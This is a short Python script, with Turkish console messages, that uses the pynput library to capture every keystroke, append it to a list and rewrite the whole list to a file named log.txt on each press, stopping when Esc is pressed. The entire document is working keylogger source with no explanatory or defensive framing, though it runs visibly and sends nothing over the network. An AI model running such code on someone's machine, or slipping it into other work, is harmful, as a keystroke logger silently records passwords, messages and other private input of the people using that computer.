import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):

    keys.append(key)
    write_file(keys)

    try:
        print('alfabetik karakter {0} basildi'.format(key.char))

    except AttributeError:
        print('ozel karakter {0} basildi'.format(key))

def write_file(keys):

    with open('log.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write(' ')

def on_release(key):

    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:

    listener.join()